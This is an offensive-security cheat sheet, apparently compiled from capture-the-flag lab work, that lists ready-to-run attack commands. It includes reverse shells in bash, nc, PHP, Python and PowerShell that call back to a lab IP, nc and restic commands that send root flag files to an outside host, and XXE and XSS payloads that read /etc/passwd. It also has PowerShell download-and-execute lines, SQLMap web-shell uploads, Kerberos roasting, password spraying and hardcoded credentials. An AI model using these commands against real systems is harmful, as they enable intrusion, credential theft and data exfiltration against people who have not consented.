# Discovery

### General

```shell
./lazyrecon.sh -d indeed.com
masscan -sS --ports 0-65535 10.10.10.185 -e tun0
./dirsearch.py -u https://thehub.buzzfeed.com/ -e php,asp,txt -t 40
```

### NMAP

```
nmap -sC -sV -oA name <ip>
#NMAP SCRIPTS
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/SecLists/Usernames/top_shortlist.txt x.x.x.x
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP
```



# Tunneling

### SSH Tunneling

```
ssh -L [local_listen_port]:[target_ip]:[target_port]
```

```
sshuttle -r root@<target_ip> 10.2.2.0/24
```

```
plink -R 2020:localhost:2020 root@10.10.16.31 -pw "toor"
```



```
dbclient -i .k -f -N -R 8888:172.19.0.4:80 dummy@10.10.14.14
```

### Without SSH

* #### portfwd

```
meterpreter > portfwd add -l 80 -r 172.19.0.4 -p 80
```

* #### Autoroute

```
msf post(multi/manage/autoroute)
```



# Shell

### Bash

```shell
#!/bin/bash
/bin/bash -c "bash &>/dev/tcp/10.10.16.104/4444 <&1"

/bin/sh -i >& /dev/tcp/10.10.16.104/4444 0>&1
```



### nc

```shell
/bin/nc -e /bin/sh 10.10.16.104 4444
ncat 10.10.14.41 3344 -e /bin/bash
/bin/nc 10.10.16.104 4444 < /root/root.txt
rm /tmp/fo;mkfifo /tmp/fo;cat /tmp/fo|/bin/sh -i 2>&1|nc 10.10.16.104 443 >/tmp/fo
```



### php

```php
GIF89a
<?php echo system($_GET['cat /etc/passwd']); ?>
<?php exec("ping 10.10.16.109")?>
/bin/php -r '$sock=fsockopen("10.10.16.104",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```



### java

```java
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```



### python

```python
python -c 'import pty; pty.spawn("/bin/bash")'


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.104",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



### find

```shell
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
```



### MSF

```
use exploit/windows/misc/hta_server
mshta.exe http://10.10.16.17:8088/bQXemyP0kTYP.hta
```



# Web

### Dir-search

```
dirsearch -u URL -e php -x 403
```



### XXE

```
<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.109:8000/"> ]> 
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```



### SSRF XSS

```html
<script>function naser(){x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();}</script>

<iframe id="myFrame" src="file:///../../index.php"></iframe>

<iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>
  
<script>
x=new XMLHttpRequest;x.onload=function({document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>script>
```



### SQLMAP

```shell
sqlmap -r exp.txt -p productName --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows 

sqlmap -r req.txt -p productId --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows --file-read=C:\\inetpub\\wwwroot\\index.php

sqlmap -r req.txt -p productId --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows --file-write=/root/Desktop/scripts/powny_shell.php --file-dest=C:\\inetpub\\wwwroot


```



### Subdomain

```
subjack -w ss.txt -t 100 -timeout 30 -o results.txt -ssl -v
python takeover.py -d domain.com -w wordlist.txt -t 20
```



### code auditing

```
./scripts/cobra.py -t <code_folder>
```



# Windows

### Generic

```
enum4linux -a IP

Get-Service
netstat -aon | find /i "listening"

(new-object System.Net.WebClient).DownloadFile('http://10.10.16.104:8000/accesschk64.exe','./ack.exe')
```



### powershell

```powershell
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.31:8000/evil.bat','C:\Temp\evil.bat')

powershell.exe -nop -w hidden -e <BASE64-UTF-16>

$user = "Fidelity\"
$pass = "l3tm3!n" | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$pass
Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { cmd.exe "/c C:\inetpub\wwwroot\uploads\nc.exe -e powershell.exe 10.10.16.104 4444" } 

C:\Users\shaun\Documents\nc.exe 10.10.16.31 8080 -e powershell.exe

```



### AD

```
./kerbrute.py -user Administrator -dc-ip 10.10.10.175 -domain EGOTISTICALBANK -passwords /usr/share/wordlists/rockyou.txt -threads 10

./GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICALBANK/svc_loanmgr -no-pass -format john -outputfile naser.txt

john --wordlist=/usr/share/wordlists/rockyou.txt naser.txt 


Pass the hash
impacket-secretsdump EGOTISTICALBANK/svc_loanmgr@sauna.htb

metasploit psexec
```



### Winrm

ports:5985-5986

```
ruby evil-winrm.rb -i control.htb -u hector -p l3tm3!n
```



### SMB

Port 139 and 445- SMB/Samba shares

Samba is a service that enables the user to share files with other machines

works the same as a command line FTP client, may browse files without even having credentials

```shell
smbmap -H 10.10.10.184 -R -u Nadine -p L1k3B1gBut7s@W0rk
nmblookup -A 10.10.10.151
nbtscan 10.10.10.185


smbclient -N -L 10.10.10.169
smbclient -N -L 10.10.10.175 -U EGOTISTICALBANK/administrator
smbclient \\\\<targetip>\\ShareName
smbclient \\\\<targetip>\\ShareName -U john

spray.sh -smb IP <users.txt> <passwords.txt> 0 0 <DOMAIN>

\# Check SMB vulnerabilities:
nmap --script=smb-check-vulns.nse <targetip> -p445

\# scan for vulnerabilities with nmap
nmap --script "vuln" <targetip> -p139,445

\# basic nmap scripts to enumerate shares and OS discovery
nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse

\# Connect using Username
root@kali:~# smbclient -L <targetip> -U username -p 445

\# enumarete with smb-shares, -a “do everything” option
enum4linux -a 192.168.1.120

\# learn the machine name and then enumerate with smbclient
nmblookup -A 192.168.1.102
smbclient -L <server_name> -I 192.168.1.105

\# rpcclient - Connect with a null-session (only works for older windows servers)
rpcclient -U james 10.10.10.52
rpcclient -U "" 192.168.1.105
(press enter if asks for a password)

rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumalsgroups domain
rpcclient $> lookupnames administrators
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> queryuser john
```



### SNMB

```
#SNMP-Check
snmp-check ip
snmp-check $IP
snmpcheck -t $IP -c public
snmpcheck -t ip.X -c public

#onesixtyone
onesixtyone -c names -i hosts

#SNMPWALK
snmpwalk -c public -v1 $IP

#SNMPENUM
perl snmpenum.pl $IP public windows.txt

#NMAP SCRIPTS
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/SecLists/Usernames/top_shortlist.txt x.x.x.x
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP
```



### PrivEsc

```
.\ack.exe "Administrator" -Kvuqw hklm\system\CurrentControlSet\services

.\achk.exe -kns HKLM\system\CurrentControlSet\services\3ware

reg query "HKLM\system\CurrentControlSet\services\3ware" /v "ImagePath"

.\ack.exe "Everyone" -kvuqsw HKLM\system\CurrentControlSet\services
```



# general

```
netstat -tulpn | grep LISTEN
ps -aux | grep root

ssh -L 8000:127.0.0.1:8000 alexa@10.10.10.163 -N
ssh -L 52846:127.0.0.1:4444 root@10.10.16.43 -N -f

curl -X POST -F username=admin -F password=admin http://localhost:52846 

$EXEC("ls -l")

sudo restic -r rest:http://10.10.15.203:8000/ backup /root/root.txt --password-file 'naser.txt'


FTP:
 wget -r ftp://anonymous:anonymous@servmon.htb/
```





# References 

[Sql Injection](http://pentestmonkey.net/category/cheat-sheet/sql-injection)

[Crack](https://crackstation.net/)

[CyberChef](https://gchq.github.io/CyberChef/)